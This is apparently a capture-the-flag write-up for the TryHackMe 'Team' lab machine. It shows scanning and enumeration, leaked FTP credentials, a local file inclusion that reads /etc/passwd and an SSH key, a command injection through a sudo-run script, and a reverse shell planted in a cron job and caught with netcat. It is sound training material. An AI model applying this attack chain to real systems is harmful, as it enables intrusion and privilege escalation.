**THM** : Team<br>
**Room Link** : https://tryhackme.com/room/teamcw<br>
**Difficulty** : Easy <br>
**Flags to capture** : User and Root<br>
**Key Topics, Techniques, and Tools** : <br>
 - Ports and Services scan : [nmap](https://nmap.org/)
 - Web content discovery : [gobuster](https://github.com/OJ/gobuster)
 - [Local File Inclusion vulnerability](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)
 - Linux privileges escalation
 - Bash scripting 

<p align="center">   <img src="https://i.imgur.com/42pavdE.png"> </p>  

# Summary

- [Adding IP to the hosts file](#adding-ip-to-the-hosts-file)
- [Nmap scan](#nmap-scan)
- [Web content discovery](#web-content-discovery)
- [FTP enumeration](#ftp-enumeration)
- [LFI exploit](#lfi-exploit)
- [User flag](#user-flag)
- [Privilege escalation](#privilege-escalation)

<p align="center">   <img src="https://i.imgur.com/Kmtrf12.png"> </p> 

## Adding IP to the hosts file 
I start by adding the IP of the machine to my hosts file:<br>
```
echo " 10.10.111.15 team.thm"|sudo tee -a /etc/hosts
```   

## Nmap scan

I perform an `Nmap` scan on the target host and save the output to a file called `nmapResults.txt` <br>
The scan includes all ports `-p-` and uses aggressive scan options `-A` <br>

```
└─# nmap team.thm -A -p- -oN nmapResults.txt   
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-01 15:47 CEST
Nmap scan report for team.thm (10.10.111.15)
Host is up (0.032s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 795f116a85c20824306cd488741b794d (RSA)
|   256 af7e3f7eb4865883f1f6a254a69bbaad (ECDSA)
|_  256 2625b07bdc3fb29437125dcd0698c79f (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Team
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Crestron XPanel control system (90%), Linux 3.10 - 3.13 (89%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.16 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%), Adtran 424RG FTTH gateway (86%), Linux 2.6.32 (86%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 21/tcp)
HOP RTT      ADDRESS
1   31.28 ms 10.8.0.1
2   31.93 ms team.thm (10.10.111.15)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 133.19 seconds

```

There are 3 open ports :
- `FTP` - `vsftpd 3.0.3` on port `21`
- `SSH` - `OpenSSH 7.6p1` on port `22`
- `HTTP` - `Apache httpd 2.4.29` on port `80` 
<br>

I didn't find any exploit on the versions of the different services, so I choose to start by the website enumeration.

## Web Content Discovery
The home page of the site is a single page that displays landscape photos :  
<img src="https://i.imgur.com/vT1drSA.png">

I didn't find anything intresting in the source code of the home page :
<img src="https://i.imgur.com/bx5ehCd.png">

There is a file `robots.txt` which contains a string `dale` which seems to be a username : 
<img src="https://i.imgur.com/mXp9G43.png">

In the same time, I ran a `gobuster` scan to enumerate the web server :

```
└─# gobuster dir -u http://team.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://team.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/05/01 16:02:56 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 305] [--> http://team.thm/images/]
/scripts              (Status: 301) [Size: 306] [--> http://team.thm/scripts/]
/assets               (Status: 301) [Size: 305] [--> http://team.thm/assets/]
/server-status        (Status: 403) [Size: 273]
```

There are 3 directories found after the `gobuster` scan. The two directories `/assets` and `/images` contain only images. 
<img src="https://i.imgur.com/7vROwyi.png">

<br>

The `/scripts` directory looks interesting but access is denied. 

<img src="https://i.imgur.com/xXZkCOA.png">

So I decide to run an enumeration of this directory by adding extensions with the command `-x` : 

```
└─# gobuster dir -u http://team.thm/scripts/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x js,txt,php   
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://team.thm/scripts/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              txt,php,js
[+] Timeout:                 10s
===============================================================
2023/05/01 16:53:43 Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 273]
/script.txt           (Status: 200) [Size: 597]
/.php                 (Status: 403) [Size: 273]
```

A `script.txt` file is located in the `/scripts` directory :
```
#!/bin/bash
read -p "Enter Username: " REDACTED
read -sp "Enter Username Password: " REDACTED
echo
ftp_server="localhost"
ftp_username="$Username"
ftp_password="$Password"
mkdir /home/username/linux/source_folder
source_folder="/home/username/source_folder/"
cp -avr config* $source_folder
dest_folder="/home/username/linux/dest_folder/"
ftp -in $ftp_server <<END_SCRIPT
quote USER $ftp_username
quote PASS $decrypt
cd $source_folder
!cd $dest_folder
mget -R *
quit

# Updated version of the script
# Note to self had to change the extension of the old "script" in this folder, as it has creds in
```

It seems that the file initially contained the ftp credentials. The last line is a comment that refers to an old script that contains the credentials that is present in this folder. <br>
I manage to download the old script (from `http://team.thm/scripts/script.old`) and recover the credentials :

```
└─# cat script.old 
#!/bin/bash
read -p "Enter Username: " ftpuser
read -sp "Enter Username Password: " T3@m$h@r3
echo
ftp_server="localhost"
ftp_username="$Username"
ftp_password="$Password"
mkdir /home/username/linux/source_folder
source_folder="/home/username/source_folder/"
cp -avr config* $source_folder
dest_folder="/home/username/linux/dest_folder/"
ftp -in $ftp_server <<END_SCRIPT
quote USER $ftp_username
quote PASS $decrypt
cd $source_folder
!cd $dest_folder
mget -R *
quit
```

## FTP enumeration
I log on to the FTP server using the credentials that i just found :
```
└─# ftp team.thm
```
I located a directory named 'workshare' that contains a file called 'New_site.txt' :
```
└─# cat New_site.txt 
Dale
        I have started coding a new website in PHP for the team to use, this is currently under development. It can be
found at ".dev" within our domain.

Also as per the team policy please make a copy of your "id_rsa" and place this in the relevent config file.

Gyles 
```

It seems that there is another site on the web server. It would be available from the subdomain `dev`. So I add it to the `/etc/hosts` file : 
```
echo "10.10.111.15 dev.team.thm"|sudo tee -a /etc/hosts
```
So I go to the URL `http://dev.team.thm/` :

<img src="https://i.imgur.com/4nnIEbH.png">

## LFI exploit
On the website of the developer it is indicated that the site is being built and there is also a link. I click on this link and I find the following URL in the path : `http://dev.team.thm/script.php?page=teamshare.php` 

It looks like there is a `local file inclusion vulnerability` in place here. I test it by trying to retrieve the contents of `/etc/passwd` with the following URL : `http://dev.team.thm/script.php?page=/etc/passwd` :

<img src="https://i.imgur.com/qtjWbrs.png">

So there is a LFI vulnerability that allows me to read files on the server.   
The message in the FTP directory referred to a `id_rsa` file containing the user's private key `dale` or `gyles` in a configuration file. So I look for it in order to try to connect with `ssh` to the machine.

After some research, I found the private key of the user `dale` in an SSH configuration file `/etc/ssh/sshd_config` : 
<img src="https://i.imgur.com/GaZMGc5.png">

I place the private key and reformat it in a file named `id_rsa`. I change the permission of the file with the command `chmod` and I try to connect with `ssh` to the machine :
```
└─# chmod 600 id_rsa  
└─# ssh -i id_rsa dale@team.thm
Last login: Mon May  1 17:42:34 2023 from 10.8.75.8
dale@TEAM:~$ whoami
dale
```

## User flag
Let's get the user.txt flag :
```
dale@TEAM:~$ ls
user.txt
dale@TEAM:~$ cat user.txt 
THM{***********}
```

## Privilege escalation
After having obtained a user access, I now try to get a root access in order to recover the root flag. <br>

As always, on a linux machine, I run the command `sudo -l` to find commands which we can execute as other users :
```
dale@TEAM:~$ sudo -l
Matching Defaults entries for dale on TEAM:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dale may run the following commands on TEAM:
    (gyles) NOPASSWD: /home/gyles/admin_checks
```

So I can run the `/home/gyles/admin_checks` file as the `gyles` user. I'll see what's in that file :
```
dale@TEAM:~$ cat /home/gyles/admin_checks 
#!/bin/bash

printf "Reading stats.\n"
sleep 1
printf "Reading stats..\n"
sleep 1
read -p "Enter name of person backing up the data: " name
echo $name  >> /var/stats/stats.txt
read -p "Enter 'date' to timestamp the file: " error
printf "The Date is "
$error 2>/dev/null

date_save=$(date "+%F-%H-%M")
cp /var/stats/stats.txt /var/stats/stats-$date_save.bak

printf "Stats have been backed up\n"
```

It seems that I can exploit the error command in this script. To do this, I set up create a payload that runs `/bin/bash` as user `gyles` :

```
dale@TEAM:~$ sudo -u gyles /home/gyles/admin_checks
Reading stats.
Reading stats..
Enter name of person backing up the data: azerty
Enter 'date' to timestamp the file: /bin/bash
The Date is 
whoami
gyles
python3 -c 'import pty;pty.spawn("/bin/bash")'
gyles@TEAM:~$ 
```
So I enter a random name and enter `/bin/bash` as the date, which gives me a shell as the user `gyles`. I then stabilize the shell with the python command `python3 -c 'import pty;pty.spawn("/bin/bash")'`  
Looking at the user’s home directory I see that the user left the `.bash_history` where I can find all commands that have been entered by the user : 
```
gyles@TEAM:/home/gyles$ cat .bash_history 
[...]
nano /usr/local/bin/main_backup.sh 
sudo nano /usr/local/bin/main_backup.sh 
[...]
cronjob -l
crontab -l
[...]
```
I see that a file that looks interesting `/usr/local/bin/main_backup.sh` has been modified by the user.  
I also see some mention of `cronjob` and `crontab` which are commands that refer to scheduled tasks or recurring jobs that run automatically at specific times and intervals.  

I check the permissions of the file and I see that it is only accessible for writing to root and members of the `admin` group. 
The user `gyles` is in the admin group as shown by the `id` command, which means that I have the right to modify the contents of the file : 
```
gyles@TEAM:/home/gyles$ ls -la /usr/local/bin/main_backup.sh 
-rwxrwxr-x 1 root admin 65 Jan 17  2021 /usr/local/bin/main_backup.sh
gyles@TEAM:/home/gyles$ id
uid=1001(gyles) gid=1001(gyles) groups=1001(gyles),1003(editors),1004(admin)
```
Looking at the content of the file I see that it is a bash script that copies backups :
```
gyles@TEAM:/home/gyles$ cat /usr/local/bin/main_backup.sh 
#!/bin/bash
cp -r /var/www/team.thm/* /var/backups/www/team.thm/
``` 

I then decide to modify the file with `nano` to add a `reverse shell` to my machine :
<img src=https://i.imgur.com/MdAeEqe.png>

Then i did set up a netcat listener.And after a few seconds I have access to a root shell :
```
└─$ nc -lvnp 9494  
listening on [any] 9494 ...
connect to [10.8.75.8] from (UNKNOWN) [10.10.183.30] 58180
sh: 0: can't access tty; job control turned off
# whoami
root
```

So I can get the root flag :
```
# ls
root.txt
# cat root.txt  
THM{************}
```

